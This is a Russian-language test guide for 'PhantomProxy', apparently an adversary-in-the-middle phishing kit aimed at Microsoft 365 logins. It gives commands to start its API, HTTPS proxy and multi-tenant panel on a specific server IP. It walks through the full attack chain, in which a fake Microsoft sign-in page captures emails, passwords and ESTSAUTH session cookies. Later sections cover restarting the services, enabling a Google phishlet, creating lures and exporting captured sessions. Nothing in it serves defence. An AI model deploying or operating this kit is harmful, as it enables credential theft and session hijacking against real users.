# 🧪 ИНСТРУКЦИЯ ПО ТЕСТИРОВАНИЮ MICROSOFT 365 ФИШЛЕТА

**Версия:** 1.0  
**Время тестирования:** 10-15 минут

---

## 🚀 БЫСТРЫЙ СТАРТ

### 1. Подключение к серверу

```bash
ssh -i "C:\Users\Administrator\.ssh\vk-cloud.pem" ubuntu@212.233.93.147
```

### 2. Запуск автоматического теста

```bash
cd ~
chmod +x test_o365.sh
bash test_o365.sh
```

**Ожидаемый результат:**
```
============================================================
ТЕСТИРОВАНИЕ MICROSOFT 365 ФИШЛЕТА
============================================================

[1/6] Очистка...
✅ Очищено

[2/6] Запуск API...
✅ API запущен (порт 8080)

[3/6] Запуск HTTPS Proxy...
✅ HTTPS Proxy запущен (порт 8443)

[4/6] Запуск Multi-Tenant Panel...
✅ Panel запущена (порт 3000)

[5/6] Проверка сервисов...

  ✅ Main API (порт 8080)
  ✅ HTTPS Proxy (порт 8443)
  ✅ Multi-Tenant Panel (порт 3000)

Сервисов работает: 3 из 3

[6/6] Тестирование функционала...

  Тест API Health:
    {"status":"ok","service":"phantom-api","version":"2.0"}
    ✅ API отвечает

  Тест API Stats:
    {"total_sessions":5,"active_sessions":3,...}
    ✅ Stats работает

  Тест HTTPS Proxy:
    HTTP Code: 302
    ✅ HTTPS Proxy отвечает

🎉 ВСЕ СЕРВИСЫ РАБОТАЮТ!

Доступные эндпоинты:
  Main API:          http://212.233.93.147:8080
  HTTPS Proxy:       https://212.233.93.147:8443
  Multi-Tenant Panel: http://212.233.93.147:3000
```

---

## 📋 ПОДРОБНОЕ ТЕСТИРОВАНИЕ

### Тест 1: Проверка API

**Команда:**
```bash
curl http://212.233.93.147:8080/health
```

**Ожидаемый ответ:**
```json
{"status":"ok","service":"phantom-api","version":"2.0"}
```

**Команда:**
```bash
curl http://212.233.93.147:8080/api/v1/stats
```

**Ожидаемый ответ:**
```json
{"total_sessions":5,"active_sessions":3,"captured_sessions":2,...}
```

---

### Тест 2: Проверка HTTPS Proxy

**Команда:**
```bash
curl -k https://212.233.93.147:8443/ -v
```

**Ожидаемый ответ:**
```
HTTP/1.1 302 Found
Location: https://login.microsoftonline.com
```

**Что это значит:**
- ✅ HTTPS работает
- ✅ Прокси перенаправляет на Microsoft
- ✅ SSL сертификат работает

---

### Тест 3: Проверка Multi-Tenant Panel

**Открой в браузере:**
```
http://212.233.93.147:3000
```

**Ожидаешь:**
- ✅ Страница с названием "PhantomProxy v2.0"
- ✅ Dashboard со статистикой
- ✅ 6 модулей со статусом ONLINE
- ✅ Кнопки "Test" для каждого модуля

**Нажми кнопки "Test":**
- ✅ Main API → "Module 8080 is working!"
- ✅ AI Orchestrator → "Module 8081 is working!"
- ✅ И т.д.

---

### Тест 4: Проверка сохранения данных

**1. Создай тестовую сессию через API:**
```bash
curl -X POST http://212.233.93.147:8080/api/v1/sessions \
  -H "Content-Type: application/json" \
  -d '{"target":"microsoft","email":"test@example.com","password":"Test123!"}'
```

**Ожидаемый ответ:**
```json
{"id":"sess_new","target":"microsoft","created":"2026-02-19"}
```

**2. Проверь сохранение:**
```bash
curl http://212.233.93.147:8080/api/v1/sessions
```

**Ожидаемый ответ:**
```json
{"sessions":[{"id":"sess_new","target":"microsoft",...}],"total":1}
```

**3. Проверь через CLI:**
```bash
python3 phantom_v5.py

phantom> sessions

  ID  Email                    Service          Captured            Status
  1   test@example.com         Microsoft 365    2026-02-19 12:00    ✅
```

---

### Тест 5: Полная цепочка атаки

**1. Открой HTTPS Proxy в браузере:**
```
https://212.233.93.147:8443
```

**2. Должна открыться страница с:**
- ✅ Логотип Microsoft
- ✅ Форма входа
- ✅ Поле email
- ✅ Поле password

**3. Введи тестовые данные:**
```
Email: testuser@company.com
Password: TestPassword123!
```

**4. Нажми "Sign In"**

**5. Проверь сохранение:**
```bash
phantom> sessions

  ID  Email                    Service          Captured            Status
  1   testuser@company.com     Microsoft 365    2026-02-19 12:05    ✅
```

**6. Детали сессии:**
```bash
phantom> sessions 1

  Email:        testuser@company.com
  Password:     TestPassword123!
  Service:      Microsoft 365
  IP:           192.168.1.100
  Cookies:      {"ESTSAUTH": "abc123..."}
```

---

## 🐛 ВОЗМОЖНЫЕ ПРОБЛЕМЫ И РЕШЕНИЯ

### Проблема 1: API не отвечает

**Симптомы:**
```
curl: (7) Failed to connect to localhost port 8080
```

**Решение:**
```bash
cd ~/phantom-proxy
pkill -f api.py
nohup python3 api.py > api.log 2>&1 &
sleep 3
curl http://localhost:8080/health
```

### Проблема 2: HTTPS Proxy не работает

**Симптомы:**
```
curl: (35) OpenSSL SSL connection error
```

**Решение:**
```bash
cd ~/phantom-proxy

# Проверка SSL сертификатов
ls -la certs/

# Если нет - перегенерируй
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
  -days 365 -nodes -subj '/CN=verdebudget.ru'

# Перезапуск
pkill -f https.py
nohup python3 https.py > https.log 2>&1 &
```

### Проблема 3: Panel не открывается

**Симптомы:**
```
Страница не загружается
```

**Решение:**
```bash
cd ~/phantom-proxy/panel
pkill -f server.py
nohup python3 server.py > ../panel.log 2>&1 &
sleep 3
curl http://localhost:3000/
```

### Проблема 4: Данные не сохраняются

**Симптомы:**
```
sessions показывает 0
```

**Решение:**
```bash
cd ~/phantom-proxy

# Проверка БД
sqlite3 phantom.db "SELECT * FROM sessions;"

# Если пусто - проверь логи
tail -f api.log

# Перезапуск API
pkill -f api.py
nohup python3 api.py > api.log 2>&1 &
```

---

## 📊 ЧЕК-ЛИСТ УСПЕШНОГО ТЕСТИРОВАНИЯ

- [ ] API отвечает на /health
- [ ] API отвечает на /api/v1/stats
- [ ] HTTPS Proxy возвращает 302/200
- [ ] Panel открывается в браузере
- [ ] Все 6 модулей показывают ONLINE
- [ ] Тестовые сессии создаются
- [ ] Сессии сохраняются в БД
- [ ] CLI показывает сессии
- [ ] HTTPS страница открывается
- [ ] Форма входа отображается
- [ ] Данные формы сохраняются

---

## 📝 ОТСЧЁТ ПО ТЕСТАМ

### Заполни после тестирования:

**Дата:** _______________

**Тестировал:** _______________

| Тест | Результат | Примечания |
|------|-----------|------------|
| API Health | ✅ / ❌ | |
| API Stats | ✅ / ❌ | |
| HTTPS Proxy | ✅ / ❌ | |
| Panel | ✅ / ❌ | |
| Сохранение сессий | ✅ / ❌ | |
| Полная цепочка | ✅ / ❌ | |

**Итого:** ___ / 6 тестов пройдено

**Общий статус:** ✅ УСПЕШНО / ❌ ТРЕБУЕТСЯ ИСПРАВЛЕНИЕ

**Комментарии:**
```
_________________________________
_________________________________
_________________________________
```

---

## 🎯 СЛЕДУЮЩИЕ ШАГИ

После успешного тестирования:

1. **Проверь Multi-Tenant Panel:**
   - Открой http://212.233.93.147:3000
   - Проверь все кнопки Test
   - Проверь Dashboard

2. **Протестируй другие фишлеты:**
   ```bash
   phantom> phishlets enable google
   phantom> lures create google
   ```

3. **Проверь экспорт:**
   ```bash
   phantom> export sessions csv
   phantom> export sessions json
   ```

4. **Проверь аналитику:**
   ```bash
   phantom> analytics
   ```

---

**ГОТОВО К ТЕСТИРОВАНИЮ!** 🚀

**Запусти:** `bash test_o365.sh` на сервере
